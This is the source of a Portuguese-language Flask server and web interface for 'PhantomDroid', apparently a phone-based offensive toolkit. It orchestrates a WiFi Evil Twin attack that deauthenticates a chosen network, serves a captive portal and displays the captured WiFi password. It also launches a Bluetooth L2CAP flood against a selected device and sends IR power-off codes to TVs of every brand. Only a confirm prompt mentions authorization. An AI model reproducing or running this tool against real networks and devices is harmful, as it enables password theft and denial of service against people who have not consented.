"""
PhantomDroid Web — Servidor Flask (versão Celular)
Módulos: IR Remote | WiFi Evil Twin | Bluetooth Deauth
Roda 100% offline dentro do APK. Sem internet necessária.
Author: Mr. Psycho | @the_psycho_of_hackers
"""

import os, sys, json, threading, socket, time
sys.path.insert(0, os.path.dirname(__file__))

try:
    from flask import Flask, jsonify, request, Response, stream_with_context
except ImportError:
    print("[!] Flask não instalado. pip install flask")
    sys.exit(1)

from modules import ir_remote, wifi_deauth, bluetooth_ctrl

app = Flask(__name__)
app.config["SECRET_KEY"] = "phantomdroid"

# ── Log global ────────────────────────────────────────────────────────────────
_log_buffer = []
_job_result  = {}

def _log(msg: str, level: str = "info"):
    entry = {"ts": time.strftime("%H:%M:%S"), "level": level, "msg": msg}
    _log_buffer.append(entry)
    if len(_log_buffer) > 300:
        _log_buffer.pop(0)
    print(f"[{entry['ts']}] {msg}")

def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return ip
    except:
        return "127.0.0.1"

# ══════════════════════════════════════════════════════════════════════════════
#  API — GERAL
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/status")
def api_status():
    bt = bluetooth_ctrl.bt_status()
    return jsonify({
        "ip":      _get_local_ip(),
        "bt_on":   bt.get("enabled", False),
        "bt_paired": bt.get("paired", 0),
        "result":  _job_result,
    })

@app.route("/api/logs")
def api_logs():
    since = int(request.args.get("since", 0))
    return jsonify(_log_buffer[since:])

@app.route("/api/stream")
def api_stream():
    def generate():
        idx = max(0, len(_log_buffer) - 1)
        while True:
            while idx < len(_log_buffer):
                entry = _log_buffer[idx]
                yield f"data: {json.dumps(entry)}\n\n"
                idx += 1
            time.sleep(0.5)
    return Response(stream_with_context(generate()),
                    mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache",
                             "X-Accel-Buffering": "no"})

# ══════════════════════════════════════════════════════════════════════════════
#  API — IR REMOTE
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/ir/brands")
def api_ir_brands():
    return jsonify(ir_remote.ALL_BRANDS)

@app.route("/api/ir/send", methods=["POST"])
def api_ir_send():
    data   = request.json or {}
    brand  = data.get("brand", "samsung")
    button = data.get("button", "power")
    ok = ir_remote.send_button(None, brand, button, silent=True)
    _log(f"IR → {brand.upper()} [{button}] {'✓' if ok else '✗'}")
    return jsonify({"ok": ok, "brand": brand, "button": button})

@app.route("/api/ir/poweroff_all", methods=["POST"])
def api_ir_poweroff_all():
    def _job():
        global _job_result
        _log("⚡ Power OFF → todas as marcas...", "warn")
        for brand in ir_remote.ALL_BRANDS:
            freq, pattern = ir_remote._get_ir_pattern(brand, "power")
            if freq:
                for _ in range(3):
                    ir_remote._send_ir(None, freq, pattern)
                    time.sleep(0.12)
                _log(f"  ✓ {brand.upper()} — {freq/1000:.1f}kHz")
            time.sleep(0.1)
        _log("✓ Power OFF enviado para todas as marcas!", "ok")
        _job_result = {"type": "ir", "status": "done"}
    threading.Thread(target=_job, daemon=True).start()
    return jsonify({"ok": True})

# ══════════════════════════════════════════════════════════════════════════════
#  API — WIFI
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/wifi/scan")
def api_wifi_scan():
    _log("📡 Escaneando redes WiFi...")
    nets = wifi_deauth.scan_networks()
    _log(f"✓ {len(nets)} rede(s) encontrada(s)")
    return jsonify({"networks": nets})

@app.route("/api/wifi/evil_twin", methods=["POST"])
def api_wifi_evil_twin():
    global _job_result
    data  = request.json or {}
    ssid  = data.get("ssid", "")
    bssid = data.get("bssid", "")
    if not ssid or not bssid:
        return jsonify({"ok": False, "msg": "SSID e BSSID obrigatórios"})

    def _job():
        global _job_result
        wifi_deauth._captured_password = ""
        wifi_deauth._capture_event.clear()
        _log(f"🎯 Alvo: {ssid} ({bssid})", "warn")
        _log("⚡ Evil Twin + Portal captivo...", "warn")
        stop_ev = threading.Event()
        orig = wifi_deauth._get_iface_linux()
        mon  = wifi_deauth._enable_monitor_mode(orig)
        threading.Thread(target=wifi_deauth._run_deauth_forever,
                         args=(bssid, mon, stop_ev), daemon=True).start()
        threading.Thread(target=wifi_deauth._run_captive_portal,
                         args=(ssid, 7070), daemon=True).start()
        _log("✓ Aguardando senha...", "ok")
        wifi_deauth._capture_event.wait(timeout=300)
        stop_ev.set()
        wifi_deauth._disable_monitor_mode(mon, orig)
        pwd = wifi_deauth._captured_password
        if pwd:
            _log(f"🔑 SENHA: {pwd}", "ok")
            _job_result = {"type": "wifi", "status": "success",
                           "ssid": ssid, "password": pwd}
        else:
            _log("⚠ Timeout — nenhuma senha capturada", "warn")
            _job_result = {"type": "wifi", "status": "timeout", "password": None}
    threading.Thread(target=_job, daemon=True).start()
    return jsonify({"ok": True})

@app.route("/api/wifi/stop", methods=["POST"])
def api_wifi_stop():
    wifi_deauth._capture_event.set()
    _log("🛑 WiFi job parado", "warn")
    return jsonify({"ok": True})

@app.route("/api/wifi/result")
def api_wifi_result():
    return jsonify(_job_result)

# ══════════════════════════════════════════════════════════════════════════════
#  API — BLUETOOTH DEAUTH
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/bt/status")
def api_bt_status():
    return jsonify(bluetooth_ctrl.bt_status())

@app.route("/api/bt/scan")
def api_bt_scan():
    _log("🔵 Escaneando Bluetooth...")
    devs = bluetooth_ctrl.bt_scan(timeout=8)
    _log(f"✓ {len(devs)} dispositivo(s) encontrado(s)")
    return jsonify({"devices": devs})

@app.route("/api/bt/deauth", methods=["POST"])
def api_bt_deauth():
    data     = request.json or {}
    mac      = data.get("mac", "")
    duration = int(data.get("duration", 30))
    threads  = int(data.get("threads", 6))
    _log(f"💀 BT Deauth → {mac} ({duration}s, {threads} threads)", "warn")
    r = bluetooth_ctrl.bt_deauth_start(mac, duration, threads)
    if r["ok"]:
        _log(f"⚡ Flood L2CAP iniciado em {mac}", "warn")
    else:
        _log(f"✗ Erro: {r['msg']}", "err")
    return jsonify(r)

@app.route("/api/bt/stop", methods=["POST"])
def api_bt_stop():
    r = bluetooth_ctrl.bt_deauth_stop()
    _log(f"🛑 BT Deauth parado — {r['packets']} pacotes enviados", "warn")
    return jsonify(r)

@app.route("/api/bt/attack_status")
def api_bt_attack_status():
    return jsonify(bluetooth_ctrl.bt_deauth_status())

# ══════════════════════════════════════════════════════════════════════════════
#  UI — HTML/CSS/JS
# ══════════════════════════════════════════════════════════════════════════════

HTML = r"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>PhantomDroid</title>
<style>
:root{--bg:#0d0d1a;--bg2:#12122a;--bg3:#1a1a35;--acc:#cc44ff;--acc2:#9922cc;
  --green:#00cc77;--red:#ff3355;--yellow:#ffcc00;--blue:#44aaff;
  --text:#e0e0ff;--dim:#888aaa}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Arial,sans-serif;
  min-height:100vh;display:flex;flex-direction:column}
/* TOP BAR */
.topbar{background:var(--bg2);border-bottom:2px solid var(--acc);padding:10px 16px;
  display:flex;align-items:center;justify-content:space-between;
  position:sticky;top:0;z-index:100}
.logo{font-size:1.3em;font-weight:900;color:var(--acc);letter-spacing:1px}
.logo span{color:var(--text);font-weight:300}
.pill{background:var(--bg3);border:1px solid var(--acc);border-radius:20px;
  padding:4px 12px;font-size:.75em;color:var(--acc)}
/* TABS */
.tabs{display:flex;overflow-x:auto;background:var(--bg2);
  border-bottom:1px solid #2a2a4a;scrollbar-width:none}
.tabs::-webkit-scrollbar{display:none}
.tab{flex:1;padding:12px 8px;cursor:pointer;font-size:.82em;color:var(--dim);
  border-bottom:3px solid transparent;transition:.2s;
  white-space:nowrap;text-align:center}
.tab.active{color:var(--acc);border-bottom-color:var(--acc)}
/* PAGES */
.page{display:none;padding:16px;max-width:560px;margin:0 auto;width:100%}
.page.active{display:block}
/* CARDS */
.card{background:var(--bg2);border:1px solid #2a2a4a;border-radius:12px;
  padding:16px;margin-bottom:14px}
.card-title{font-size:.82em;color:var(--acc);font-weight:700;
  text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;
  display:flex;align-items:center;gap:8px}
/* BUTTONS */
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;
  padding:12px 20px;border:none;border-radius:8px;font-size:.9em;
  font-weight:600;cursor:pointer;transition:.15s;width:100%;margin-top:6px}
.btn-primary{background:var(--acc);color:#fff}
.btn-primary:active{background:var(--acc2)}
.btn-danger{background:var(--red);color:#fff}
.btn-danger:active{background:#cc0022}
.btn-success{background:var(--green);color:#000}
.btn-warn{background:var(--yellow);color:#000}
.btn-blue{background:var(--blue);color:#000}
.btn-ghost{background:transparent;color:var(--acc);border:1px solid var(--acc)}
.btn:disabled{opacity:.4;cursor:not-allowed}
/* INPUTS */
input,select{width:100%;background:var(--bg3);border:1px solid #3a3a5a;
  border-radius:8px;padding:10px 12px;color:var(--text);font-size:.9em;margin-top:6px}
input:focus,select:focus{outline:none;border-color:var(--acc)}
label{font-size:.8em;color:var(--dim);margin-top:10px;display:block}
/* IR REMOTE */
.remote{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px}
.rkey{background:var(--bg3);border:1px solid #3a3a5a;border-radius:10px;
  padding:12px 6px;text-align:center;cursor:pointer;font-size:.78em;
  transition:.12s;user-select:none}
.rkey:active{background:var(--acc);color:#fff;transform:scale(.93)}
.rkey.power{background:#2a0010;border-color:var(--red);color:var(--red);grid-column:span 2}
.rkey.wide{grid-column:span 2}
.rkey.ok{background:#0a2a0a;border-color:var(--green);color:var(--green);font-size:1.1em}
/* NET/BT LIST */
.dev-item{background:var(--bg3);border:1px solid #2a2a4a;border-radius:8px;
  padding:12px;margin-bottom:8px;display:flex;align-items:center;
  gap:10px;cursor:pointer;transition:.15s}
.dev-item:active,.dev-item.selected{border-color:var(--acc);background:#1a0033}
.dev-name{font-weight:700;font-size:.9em}
.dev-info{font-size:.75em;color:var(--dim)}
/* RESULT */
.result-banner{background:#001a00;border:2px solid var(--green);
  border-radius:10px;padding:16px;text-align:center;display:none}
.result-banner.show{display:block}
.result-pass{font-size:1.5em;font-weight:900;color:var(--green);
  letter-spacing:2px;word-break:break-all}
/* LOG */
.logbox{background:#050510;border:1px solid #1a1a3a;border-radius:8px;
  padding:10px;height:240px;overflow-y:auto;font-family:monospace;font-size:.78em}
.log-info{color:var(--dim)}.log-ok{color:var(--green)}
.log-warn{color:var(--yellow)}.log-err{color:var(--red)}
/* BADGE */
.badge{display:inline-block;padding:2px 8px;border-radius:12px;
  font-size:.7em;font-weight:700}
.badge-green{background:#002a00;color:var(--green);border:1px solid var(--green)}
.badge-red{background:#2a0000;color:var(--red);border:1px solid var(--red)}
.badge-yellow{background:#2a2000;color:var(--yellow);border:1px solid var(--yellow)}
.badge-blue{background:#001a2a;color:var(--blue);border:1px solid var(--blue)}
/* SPINNER */
@keyframes spin{to{transform:rotate(360deg)}}
.spinner{width:16px;height:16px;border:3px solid #3a3a5a;
  border-top-color:var(--acc);border-radius:50%;
  animation:spin .7s linear infinite;display:none}
.spinner.show{display:inline-block}
/* PACKET COUNTER */
.pkt-counter{font-size:2em;font-weight:900;color:var(--red);
  text-align:center;padding:8px;font-family:monospace}
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="topbar">
  <div class="logo">👻 Phantom<span>Droid</span></div>
  <div class="pill" id="topStatus">Carregando...</div>
</div>

<!-- TABS -->
<div class="tabs">
  <div class="tab active" onclick="showPage('remote')">📺 IR</div>
  <div class="tab" onclick="showPage('wifi')">📶 WiFi</div>
  <div class="tab" onclick="showPage('bt')">🔵 BT</div>
  <div class="tab" onclick="showPage('logs')">📋 Logs</div>
</div>

<!-- ══════════ IR REMOTE ══════════ -->
<div class="page active" id="page-remote">
  <div class="card">
    <div class="card-title">📺 Controle Remoto Universal</div>
    <label>Marca da TV</label>
    <select id="irBrand" onchange="renderRemote()"></select>
    <button class="btn btn-danger" style="margin-top:12px" onclick="irPowerAll()">
      ⚡ Desligar TODAS as Marcas
    </button>
  </div>
  <div class="card">
    <div class="card-title">🎮 Controle — <span id="brandLabel">—</span></div>
    <div class="remote" id="remoteKeys"></div>
  </div>
</div>

<!-- ══════════ WIFI ══════════ -->
<div class="page" id="page-wifi">
  <div class="card">
    <div class="card-title">
      📡 Redes WiFi
      <div class="spinner" id="wifiSpinner"></div>
    </div>
    <button class="btn btn-primary" onclick="wifiScan()">🔍 Escanear</button>
    <div id="netList" style="margin-top:12px"></div>
  </div>
  <div class="card" id="attackCard" style="display:none">
    <div class="card-title">🎯 Alvo Selecionado</div>
    <div id="targetInfo" style="font-size:.9em;margin-bottom:10px"></div>
    <button class="btn btn-danger" onclick="startEvilTwin()">
      💀 Evil Twin + Captura de Senha
    </button>
    <button class="btn btn-warn" onclick="stopWifi()" style="margin-top:4px">
      🛑 Parar
    </button>
  </div>
  <div class="result-banner" id="passResult">
    <div style="font-size:.8em;color:var(--dim);margin-bottom:6px">🔑 SENHA CAPTURADA</div>
    <div class="result-pass" id="passValue">—</div>
    <div style="font-size:.8em;color:var(--dim);margin-top:6px" id="passNet">—</div>
  </div>
</div>

<!-- ══════════ BLUETOOTH ══════════ -->
<div class="page" id="page-bt">
  <div class="card">
    <div class="card-title">🔵 Bluetooth Deauth</div>
    <div id="btStatusInfo" style="font-size:.85em;color:var(--dim);margin-bottom:10px">
      Verificando BT...
    </div>
    <button class="btn btn-blue" onclick="btScan()">
      🔍 Escanear Dispositivos
      <div class="spinner" id="btSpinner"></div>
    </button>
    <div id="btList" style="margin-top:12px"></div>
  </div>

  <div class="card" id="btAttackCard" style="display:none">
    <div class="card-title">💀 Alvo</div>
    <div id="btTargetInfo" style="font-size:.9em;margin-bottom:12px"></div>

    <label>Duração (segundos)</label>
    <input type="number" id="btDuration" value="30" min="5" max="120">

    <label>Intensidade (threads)</label>
    <select id="btThreads">
      <option value="3">Leve (3)</option>
      <option value="6" selected>Normal (6)</option>
      <option value="12">Intenso (12)</option>
      <option value="20">Máximo (20)</option>
    </select>

    <button class="btn btn-danger" id="btnBtAttack" onclick="startBtDeauth()">
      ⚡ Iniciar Deauth
    </button>
    <button class="btn btn-warn" onclick="stopBt()" style="margin-top:4px">
      🛑 Parar
    </button>
  </div>

  <div class="card" id="btRunCard" style="display:none">
    <div class="card-title">🔥 Ataque em Andamento</div>
    <div class="pkt-counter" id="pktCount">0</div>
    <div style="text-align:center;font-size:.8em;color:var(--dim)">
      pacotes L2CAP enviados
    </div>
    <div id="btRunInfo" style="text-align:center;font-size:.82em;
      color:var(--yellow);margin-top:8px"></div>
  </div>
</div>

<!-- ══════════ LOGS ══════════ -->
<div class="page" id="page-logs">
  <div class="card">
    <div class="card-title">
      📋 Log em Tempo Real
      <button class="btn btn-ghost"
        style="width:auto;padding:4px 10px;font-size:.75em"
        onclick="clearLog()">🗑 Limpar</button>
    </div>
    <div class="logbox" id="logBox"></div>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);
let selectedNet = null, selectedBt = null;

// ── API ───────────────────────────────────────────────────────────────────────
async function api(path, body=null) {
  const opts = body
    ? {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}
    : {method:'GET'};
  const r = await fetch(path, opts);
  return r.json();
}

// ── Navegação ─────────────────────────────────────────────────────────────────
function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  $('page-'+name).classList.add('active');
  document.querySelectorAll('.tab').forEach(t => {
    if(t.textContent.toLowerCase().includes(name.substring(0,2)))
      t.classList.add('active');
  });
}

// ── Status ────────────────────────────────────────────────────────────────────
async function refreshStatus() {
  try {
    const s = await api('/api/status');
    $('topStatus').textContent = s.bt_on ? '🔵 BT ON' : '⚫ BT OFF';
    $('btStatusInfo').innerHTML =
      `BT: <b style="color:${s.bt_on?'var(--green)':'var(--red)'}">
        ${s.bt_on?'Ligado':'Desligado'}</b> · ${s.bt_paired} pareado(s)`;
    // mostra senha WiFi se capturada
    if(s.result && s.result.password) {
      $('passValue').textContent = s.result.password;
      $('passNet').textContent   = s.result.ssid || '';
      $('passResult').classList.add('show');
    }
  } catch(e){}
}

// ── Log SSE ───────────────────────────────────────────────────────────────────
function startLogStream() {
  const es = new EventSource('/api/stream');
  es.onmessage = e => {
    const d = JSON.parse(e.data);
    const box = $('logBox');
    const div = document.createElement('div');
    div.className = 'log-' + (d.level||'info');
    div.textContent = `[${d.ts}] ${d.msg}`;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
  };
}
function clearLog() { $('logBox').innerHTML = ''; }

// ══════════════════════════════════════════════════════════════════════════════
//  IR REMOTE
// ══════════════════════════════════════════════════════════════════════════════
const REMOTE_DEF = [
  ['⏻ Power',  'power',   'power wide'],
  ['🔇 Mudo',  'mute',    ''],
  ['🔊 Vol+',  'vol_up',  ''],
  ['🔉 Vol-',  'vol_down',''],
  ['📺 CH+',   'ch_up',   ''],
  ['📺 CH-',   'ch_down', ''],
  ['🏠 Home',  'home',    ''],
  ['↩ Back',   'back',    ''],
  ['⬆',        'up',      'wide'],
  ['⬅',        'left',    ''],
  ['✅ OK',    'ok',      'ok'],
  ['➡',        'right',   ''],
  ['⬇',        'down',    'wide'],
  ['🔌 Source','source',  ''],
  ['📋 Menu',  'menu',    ''],
  ['1','num_1',''],['2','num_2',''],['3','num_3',''],
  ['4','num_4',''],['5','num_5',''],['6','num_6',''],
  ['7','num_7',''],['8','num_8',''],['9','num_8',''],
  ['🎬','netflix',''],['▶ YT','youtube',''],['0','num_0',''],
  ['HDMI1','hdmi1',''],['HDMI2','hdmi2',''],['HDMI3','hdmi3',''],
];

async function loadBrands() {
  const brands = await api('/api/ir/brands');
  const sel = $('irBrand');
  brands.forEach(b => {
    const o = document.createElement('option');
    o.value = b; o.textContent = b.toUpperCase();
    sel.appendChild(o);
  });
  renderRemote();
}

function renderRemote() {
  const brand = $('irBrand').value;
  $('brandLabel').textContent = brand.toUpperCase();
  const grid = $('remoteKeys');
  grid.innerHTML = '';
  REMOTE_DEF.forEach(([label, key, cls]) => {
    const d = document.createElement('div');
    d.className = 'rkey '+(cls||'');
    d.textContent = label;
    d.onclick = () => sendIR(brand, key);
    grid.appendChild(d);
  });
}

async function sendIR(brand, button) {
  const r = await api('/api/ir/send', {brand, button});
  if(!r.ok) showToast(`⚠ ${button} indisponível para ${brand}`);
}

async function irPowerAll() {
  if(!confirm('Enviar POWER OFF para todas as marcas de TV?')) return;
  await api('/api/ir/poweroff_all', {});
  showToast('⚡ Power OFF enviado para todas as TVs!');
}

// ══════════════════════════════════════════════════════════════════════════════
//  WIFI
// ══════════════════════════════════════════════════════════════════════════════
async function wifiScan() {
  $('wifiSpinner').classList.add('show');
  $('netList').innerHTML = '<div style="color:var(--dim);font-size:.85em">Escaneando...</div>';
  selectedNet = null;
  $('attackCard').style.display = 'none';
  const r = await api('/api/wifi/scan');
  $('wifiSpinner').classList.remove('show');
  renderNetworks(r.networks || []);
}

function sigIcon(sig) {
  if(!sig||sig==='N/A') return '📶';
  const n = parseInt(sig);
  return n >= 70 ? '📶' : n >= 40 ? '📡' : '🔴';
}

function renderNetworks(nets) {
  const list = $('netList');
  if(!nets.length) {
    list.innerHTML='<div style="color:var(--dim)">Nenhuma rede encontrada.</div>';
    return;
  }
  list.innerHTML = nets.map((n,i) => `
    <div class="dev-item" id="net${i}" onclick="selectNet(${i})">
      <span style="font-size:1.3em">${sigIcon(n.signal)}</span>
      <div style="flex:1">
        <div class="dev-name">${n.ssid||'?'}</div>
        <div class="dev-info">${n.bssid||''} · Canal ${n.channel||'?'} · ${n.security||'?'}</div>
      </div>
    </div>`).join('');
  list._data = nets;
}

function selectNet(i) {
  document.querySelectorAll('.dev-item').forEach(e=>e.classList.remove('selected'));
  $('net'+i).classList.add('selected');
  selectedNet = $('netList')._data[i];
  $('targetInfo').innerHTML =
    `<b>${selectedNet.ssid}</b><br>
     <span class="badge badge-yellow">${selectedNet.bssid}</span>
     <span class="badge badge-blue">Canal ${selectedNet.channel}</span>`;
  $('attackCard').style.display = 'block';
}

async function startEvilTwin() {
  if(!selectedNet){showToast('Selecione uma rede primeiro');return;}
  if(!confirm(`Evil Twin em:\n${selectedNet.ssid}\n${selectedNet.bssid}\n\nApenas em redes autorizadas!`)) return;
  $('passResult').classList.remove('show');
  await api('/api/wifi/evil_twin',{ssid:selectedNet.ssid,bssid:selectedNet.bssid});
  showToast('Evil Twin ativado — aguardando senha...');
}

async function stopWifi() {
  await api('/api/wifi/stop');
  showToast('🛑 WiFi parado');
}

// ══════════════════════════════════════════════════════════════════════════════
//  BLUETOOTH DEAUTH
// ══════════════════════════════════════════════════════════════════════════════
async function btScan() {
  $('btSpinner').classList.add('show');
  $('btList').innerHTML = '<div style="color:var(--dim);font-size:.85em">Escaneando BT (~8s)...</div>';
  $('btAttackCard').style.display = 'none';
  selectedBt = null;
  const r = await api('/api/bt/scan');
  $('btSpinner').classList.remove('show');
  renderBtDevices(r.devices || []);
}

function renderBtDevices(devs) {
  const list = $('btList');
  if(!devs.length) {
    list.innerHTML='<div style="color:var(--dim)">Nenhum dispositivo encontrado.</div>';
    return;
  }
  list.innerHTML = devs.map((d,i) => `
    <div class="dev-item" id="bt${i}" onclick="selectBt(${i})">
      <span style="font-size:1.5em">🔵</span>
      <div style="flex:1">
        <div class="dev-name">${d.name||'?'}</div>
        <div class="dev-info">${d.address} · ${d.class||''}</div>
      </div>
      ${d.paired?'<span class="badge badge-green">Pareado</span>':''}
    </div>`).join('');
  list._data = devs;
}

function selectBt(i) {
  document.querySelectorAll('#btList .dev-item').forEach(e=>e.classList.remove('selected'));
  $('bt'+i).classList.add('selected');
  selectedBt = $('btList')._data[i];
  $('btTargetInfo').innerHTML =
    `<b>${selectedBt.name}</b><br>
     <span class="badge badge-blue">${selectedBt.address}</span>`;
  $('btAttackCard').style.display = 'block';
}

let btPollInterval = null;

async function startBtDeauth() {
  if(!selectedBt){showToast('Selecione um dispositivo');return;}
  const mac      = selectedBt.address;
  const duration = parseInt($('btDuration').value)||30;
  const threads  = parseInt($('btThreads').value)||6;
  if(!confirm(`Iniciar Deauth BT em:\n${selectedBt.name}\n${mac}\n\nApenas em dispositivos autorizados!`)) return;

  $('btRunCard').style.display = 'block';
  $('pktCount').textContent = '0';
  $('btRunInfo').textContent = `Alvo: ${mac} · ${duration}s · ${threads} threads`;

  await api('/api/bt/deauth', {mac, duration, threads});
  showToast(`⚡ BT Deauth iniciado em ${mac}`);

  // Atualiza contador de pacotes
  if(btPollInterval) clearInterval(btPollInterval);
  btPollInterval = setInterval(async () => {
    const st = await api('/api/bt/attack_status');
    $('pktCount').textContent = st.packets || '0';
    if(st.status !== 'running') {
      clearInterval(btPollInterval);
      showToast(`🛑 Deauth finalizado — ${st.packets} pacotes enviados`);
      $('btRunCard').style.display = 'none';
    }
  }, 500);
}

async function stopBt() {
  const r = await api('/api/bt/stop');
  if(btPollInterval) clearInterval(btPollInterval);
  $('btRunCard').style.display = 'none';
  showToast(`🛑 Parado — ${r.packets} pacotes enviados`);
}

// ── Toast ─────────────────────────────────────────────────────────────────────
function showToast(msg) {
  let t = document.createElement('div');
  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);' +
    'background:#cc44ff;color:#fff;padding:10px 22px;border-radius:20px;' +
    'font-size:.85em;z-index:9999;max-width:90vw;text-align:center;' +
    'box-shadow:0 4px 20px #cc44ff55';
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 3000);
}

// ── Init ──────────────────────────────────────────────────────────────────────
loadBrands();
startLogStream();
refreshStatus();
setInterval(refreshStatus, 4000);
</script>
</body>
</html>"""

@app.route("/")
def index():
    return HTML

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def start(host="0.0.0.0", port=8080, open_browser=True):
    _log(f"PhantomDroid iniciando em http://{_get_local_ip()}:{port}", "ok")
    if open_browser:
        def _open():
            time.sleep(1.5)
            try:
                import webbrowser
                webbrowser.open(f"http://127.0.0.1:{port}")
            except:
                pass
        threading.Thread(target=_open, daemon=True).start()
    app.run(host=host, port=port, debug=False, threaded=True, use_reloader=False)

if __name__ == "__main__":
    start()
